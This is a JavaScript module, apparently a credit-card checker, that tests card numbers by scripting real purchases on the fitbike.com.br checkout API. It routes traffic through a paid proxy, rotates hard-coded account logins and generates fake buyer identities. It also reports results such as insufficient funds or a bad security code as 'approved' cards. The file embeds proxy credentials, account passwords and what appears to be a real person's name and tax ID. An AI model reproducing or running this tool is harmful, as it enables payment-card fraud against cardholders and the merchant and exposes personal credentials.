import axios from 'axios';
import chalk from 'chalk';
import { HttpsProxyAgent } from 'https-proxy-agent';
import randomUseragent from 'random-useragent';

// Configuração do proxy
const proxyConfig = {
    protocol: 'http',
    host: 'rp.proxyscrape.com',
    port: 6060,
    auth: {
        username: 'jpn645m14q0pkq9-country-br',
        password: '1witm204vszvwdv'
    }
};
const proxyAgent = new HttpsProxyAgent(`http://${proxyConfig.auth.username}:${proxyConfig.auth.password}@${proxyConfig.host}:${proxyConfig.port}`);



// Array de logins (email e senha)
const logins = [
    { email: 'daniloplay60@gmail.com', senha: 'i63Jh3BX@G9@j' },
    { email: 'loppesofc@gmail.com', senha: 'i63Jh3BX@G9@j' },
    { email: 'yowavax555@adosnan.com', senha: 'i63Jh3BX@G9@j' },
];

// Variável para armazenar o índice atual do login
let loginIndex = 0;


function getNextLogin() {
    const login = logins[loginIndex]; // Pega o login atual
    loginIndex = (loginIndex + 1) % logins.length; // Atualiza o índice (se reinicia no final)
    return login; // Retorna o login
}


// Função para gerar pessoa aleatória
async function generateRandomPerson() {
    try {
        const response = await axios.post(
            'https://www.4devs.com.br/ferramentas_online.php',
            new URLSearchParams({
                'acao': 'gerar_pessoa',
                'sexo': 'I',
                'pontuacao': 'S',
                'idade': '0',
                'cep_estado': '',
                'txt_qtde': '1',
                'cep_cidade': ''
            }),
            {
                headers: {
                    'Host': 'www.4devs.com.br',
                    'sec-ch-ua-platform': '"Windows"',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                    'sec-ch-ua-mobile': '?0',
                    'accept': '*/*',
                    'origin': 'https://www.4devs.com.br',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.4devs.com.br/gerador_de_pessoas',
                    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                }
            }
        );
        return response.data[0];
    } catch (error) {
        console.error('Erro ao gerar pessoa:', error.response?.data || error.message);
        return null;
    }
}


async function removeItem(acesstoken, id) {
    const response = await axios.delete(`https://api.fitbike.com.br/api/v1/checkouts/checkout-lines/${id}/`, {
        headers: {
            'Host': 'api.fitbike.com.br',
            'sec-ch-ua-platform': '"Windows"',
            'authorization': `JWT ${acesstoken}`,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            'sec-ch-ua-mobile': '?0',
            'origin': 'https://fitbike.com.br',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://fitbike.com.br/',
            'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i'
        },
        httpsAgent: proxyAgent
    });
    console.log(response.data)
}
// Função de compra
async function makePurchase(numberGG, monthGG, yearGG, cvvGG) {
    console.log(numberGG, monthGG,yearGG,cvvGG)
    const startTime = Date.now();  // Captura o tempo de início
    const { email, senha } = getNextLogin();
    console.log(email, senha)

    try {
        const randomPerson = await generateRandomPerson();
        if (!randomPerson) throw new Error('Falha ao gerar pessoa.');

        const cpfFormatted = randomPerson.cpf.replace(/\D/g, '');
        const userAgent = randomUseragent.getRandom();
        console.log(randomPerson.email)

        let cepSemTraco = randomPerson.cep.replace(/-/g, '');
        //console.log(`Tempo de requisição: ${durationInSeconds.toFixed(2)} segundos`);
        const primeirosQuatro = numberGG.slice(0, 4);

        const response = await axios.post(
            'https://api.fitbike.com.br/api/v1/jwt/token-auth/',
            {
                'email': email,
                'password': senha
            },
            {
                headers: {
                    'Host': 'api.fitbike.com.br',
                    'sec-ch-ua-platform': '"Windows"',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                    'sec-ch-ua-mobile': '?0',
                    'origin': 'https://fitbike.com.br',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://fitbike.com.br/',
                    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i'
                },
                httpsAgent: proxyAgent
            }
        );
        let token = response.data;
        if (!token.token) {
            return console.log('CARD WAS DECLINED')
        }

        const addProduct = await axios.post(
            'https://api.fitbike.com.br/api/v1/checkouts/checkouts/current/add-product/',
            {
                'product': 41,
                'quantity': 1,
                'pos_id': 1
            },
            {
                headers: {
                    'Host': 'api.fitbike.com.br',
                    'sec-ch-ua-platform': '"Windows"',
                    'authorization': `JWT ${token.token}`,
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                    'sec-ch-ua-mobile': '?0',
                    'origin': 'https://fitbike.com.br',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://fitbike.com.br/',
                    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i'
                },
                httpsAgent: proxyAgent
            }
        );

        let ResponseProduct = addProduct.data
        //  console.log(ResponseProduct);
        ///id
        const patch2 = await axios.patch(
            'https://api.fitbike.com.br/api/v1/checkouts/checkouts/current/',
            {
                'card_bin_number': primeirosQuatro,
                'payment_method': 2,
                'installments': 1
            },
            {
                headers: {
                    'Host': 'api.fitbike.com.br',
                    'sec-ch-ua-platform': '"Windows"',
                    'authorization': `JWT ${token.token}`,
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                    'sec-ch-ua-mobile': '?0',
                    'origin': 'https://fitbike.com.br',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://fitbike.com.br/',
                    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i'
                },
                httpsAgent: proxyAgent
            }
        );


        const patch3 = await axios.patch(
            'https://api.fitbike.com.br/api/v1/checkouts/checkouts/current/',
            {
                'installments': 1
            },
            {
                headers: {
                    'Host': 'api.fitbike.com.br',
                    'sec-ch-ua-platform': '"Windows"',
                    'authorization': `JWT ${token.token}`,
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                    'sec-ch-ua-mobile': '?0',
                    'origin': 'https://fitbike.com.br',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://fitbike.com.br/',
                    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i'
                },
                httpsAgent: proxyAgent
            }
        );


        const placeOrder = await axios.post(
            `https://api.fitbike.com.br/api/v1/checkouts/checkouts/${ResponseProduct.id}/place-order/`,
            {
                'point_of_sale': 1,
                'channel': 'web'
            },
            {
                headers: {
                    'Host': 'api.fitbike.com.br',
                    'sec-ch-ua-platform': '"Windows"',
                    'authorization': `JWT ${token.token}`,
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                    'sec-ch-ua-mobile': '?0',
                    'origin': 'https://fitbike.com.br',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://fitbike.com.br/',
                    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i'
                },
                httpsAgent: proxyAgent
            }
        );

        //console.log(placeOrder.data)

        const createPayment = await axios.post(
            `https://api.fitbike.com.br/api/v1/checkouts/checkouts/${ResponseProduct.id}/create-payment/`,
            '',
            {
                headers: {
                    'Host': 'api.fitbike.com.br',
                    //'Cookie': 'csrftoken=X0CigUQbgVO8c3YdhkuPZVvHtBJIpVK3gtvULHLWM4urvdgsyg9qPxn8vV6pSnbn',
                    'sec-ch-ua-platform': '"Windows"',
                    'authorization': `JWT ${token.token}`,
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                    'accept': 'application/json, text/plain, */*',
                    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                    'sec-ch-ua-mobile': '?0',
                    'origin': 'https://fitbike.com.br',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://fitbike.com.br/',
                    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i',
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                httpsAgent: proxyAgent
            }
        );

        let ResponsePayment = createPayment.data

        //console.log(createPayment.data);

        const post01 = await axios.patch(
            'https://api.fitbike.com.br/api/v1/checkouts/checkouts/current/',
            {
                'payment_method': 2
            },
            {
                headers: {
                    'Host': 'api.fitbike.com.br',
                    'sec-ch-ua-platform': '"Windows"',
                    'authorization': `JWT ${token.token}`,
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                    'sec-ch-ua-mobile': '?0',
                    'origin': 'https://fitbike.com.br',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://fitbike.com.br/',
                    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i'
                },
                httpsAgent: proxyAgent
            }
        );

        const makePurchase = await axios.post(
            'https://api.fitbike.com.br/api/v2/pay/transactions/',
            {
                'pos': 'site',
                'channel': 'web',
                'order_number': ResponsePayment.order_number,
                'tenant': 'fitbike',
                'capture': true,
                'payment_method': 'creditcard',
                'public_key': ResponsePayment.pay_key_public,
                'payment_id': ResponsePayment.payment_id,
                'installments': 1,
                'reference': ResponsePayment.id,
                'customer': {
                    'name': 'MARCELO HENRIQUE FREITAS FONSECA',
                    'email': email,
                    'cpf': '16683549850',
                    'mobile_phone': '55 91985 361837',
                    'birthdate': '2000-07-09',
                    'address': {
                        'zip_code': '',
                        'address1': '',
                        'address2': '',
                        'address3': '',
                        'address4': '',
                        'city': '',
                        'state': '',
                        'country': 'BR'
                    }
                },
                'card_data': {
                    'card_number': numberGG,
                    'expiration_date': `${monthGG}/20${yearGG}`,
                    'holder': randomPerson.nome,
                    'security_code': cvvGG
                }
            },
            {
                headers: {
                    'Host': 'api.fitbike.com.br',
                    'sec-ch-ua-platform': '"Windows"',
                    'authorization': `JWT ${token.token}`,
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                    'sec-ch-ua-mobile': '?0',
                    'origin': 'https://fitbike.com.br',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://fitbike.com.br/',
                    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i'
                },
                httpsAgent: proxyAgent
            }
        );

        //  console.log("response do pagamento ze", makePurchase.data);

        let returnCode = makePurchase.data.reason;

        //     removeItem(token.token, ResponseProduct.lines_info[0].id)



        if (makePurchase.data.status == 'captured') {
            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode} R$43,00 💸|  [@loficenter]`));
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode} R$43,00 💸|  [@loficenter]`;
        } else if (returnCode.includes('Saldo insuficiente')) {
            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode} R$43,00 💸|  [@loficenter]`));
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode} R$43,00 💸|  [@loficenter]`;

        } else if (returnCode.includes('Limite de saque excedido')) {
            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode} 💸|   [@loficenter]`));
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode} 💸|   [@loficenter]`;

        } else if (returnCode.includes('C\u00f3digo de seguran\u00e7a inv\u00e1lido')) {
            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - Código de segurança inválido 💸|   [@loficenter]`));
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - Código de segurança inválido 💸|   [@loficenter]`;

        } else if (returnCode.includes('suportada')) {
            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode} 💸|   [@loficenter]`));
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode} 💸|   [@loficenter]`;

        } else if (returnCode.includes('de segur')) {
            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode} 💸|   [@loficenter]`));
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode} 💸|   [@loficenter]`;

        } else {
            console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode.reason} - `));
            return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode.reason} - `;

        }

    } catch (error) {
      //  console.log(error.response.data)

        let returnCode = error.response.data;

        if (returnCode.status == 'captured') {
            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode.reason} R$43,00 💸| [@loficenter]`));
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode.reason} R$43,00 💸|  [@loficenter]`;

        } else if (returnCode.reason.includes('Saldo insuficiente')) {
            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode.reason} R$43,00 💸| [@loficenter]`));
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode.reason} R$43,00 💸|  [@loficenter]`;

        } else if (returnCode.reason.includes('Limite de saque excedido')) {
            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode.reason} 💸| [@loficenter]`));
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode.reason} 💸|   [@loficenter]`;

        } else if (returnCode.reason.includes('C\u00f3digo de seguran\u00e7a inv\u00e1lido')) {
            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - Código de segurança inválido 💸| [@loficenter]`));
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - Código de segurança inválido 💸|   [@loficenter]`;

        } else if (returnCode.reason.includes('suportada')) {
            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode.reason} 💸| [@loficenter]`));
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode.reason} 💸|   [@loficenter]`;

        } else if (returnCode.reason.includes('de segur')) {
            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode.reason} 💸| [@loficenter]`));
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode.reason} 💸|   [@loficenter]`;

        } else {
            console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode.reason} - [@loficenter] `));
            return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode.reason} - `;

        }

    }
}

async function executeFlow(value) {
    try {

        // const uniqueList = [...new Set(list)];

        //   for (let value of uniqueList) {

        const [numberGG, monthGG, yearGG, cvvGG] = value.split('|');
        const yearSplited = yearGG.split('20')[1];
        // console.log(numberGG,monthGG,yearSplited,cvvGG)

        try {
             let respoonse =  await makePurchase(numberGG, monthGG, yearSplited, cvvGG);
            return respoonse
        } catch (purchaseError) {
            console.error('Erro ao realizar a compra:', purchaseError.message);
        }

        //  }

    } catch (error) {
        console.error('Erro no fluxo principal:', error.message);
    }
}

export default executeFlow
